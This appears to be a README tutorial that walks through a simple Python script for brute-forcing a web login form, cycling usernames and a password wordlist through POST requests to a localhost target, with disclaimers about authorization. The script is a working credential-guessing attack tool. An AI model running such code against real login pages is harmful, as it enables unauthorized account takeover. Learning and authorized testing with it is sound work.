# Web-Login-Form-Brute-Forcing

## _Note:_
 _A web application you are authorized to test is required to test this script._
 <br>
 <br>

### Steps to perform Brute Forcing on Login Pages using the provided script:

#### 1. Import required libraries:
    import requests
    import sys
<br>

#### 2. Set up target URL and parameters:
    target = "http://127.0.0.1:5000"
    usernames = ["admin", "user", "test"]
    passwords = "top-100-list.txt"
    needle = "Welcome Back"
<br>

#### 3. Create a loop to iterate through usernames:
    for username in usernames:

<br>

#### 4. Open and read the password file:
    with open(passwords, "r") as passwords_list:

<br>

#### 5. Create a nested loop to iterate through passwords:
    for password in passwords_list:
                password = password.strip("\n").encode()

<br>

#### 6. Display current attempt:
    sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
                sys.stdout.flush()

<br>

#### 7. Send POST request to the target URL:
    r = requests.post(target, data={"username": username, "password": password})

<br>

#### 8. Check if login was successful:
    if needle.encode() in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write("\t[>>>>>>] Valid Password '{}' found for user '{}'!".format(password.decode(), username))
                    sys.exit()

<br>

#### 9. Handle case when no password is found:
    sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write("\tNo Password Found for '{}'!".format(username))
            sys.stdout.write("\n")

<br>

_This script provides a basic framework for brute-forcing web login forms._ 

_However, it's important to note that using such scripts without permission is illegal and unethical._

_Always ensure you have proper authorization before testing security measures._
